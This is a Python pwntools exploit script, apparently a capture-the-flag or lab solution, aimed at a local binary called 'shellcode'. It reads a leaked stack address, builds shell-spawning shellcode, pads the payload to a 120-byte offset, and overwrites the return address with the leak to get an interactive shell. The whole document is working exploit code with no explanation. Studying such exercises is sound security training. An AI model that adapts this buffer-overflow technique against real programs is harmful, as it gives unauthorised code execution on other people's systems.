from pwn import *

context(os="linux", arch="amd64")

p = process("./shellcode")

leak = int(p.recvline(),16)

log.info("Stack leak: " + hex(leak))

sh_addr = p64(leak)

offset = 120

sc = asm(shellcraft.sh())

payload = sc
payload += cyclic(offset-len(sc))
payload += sh_addr

p.sendline(payload)
p.interactive()

p.close()
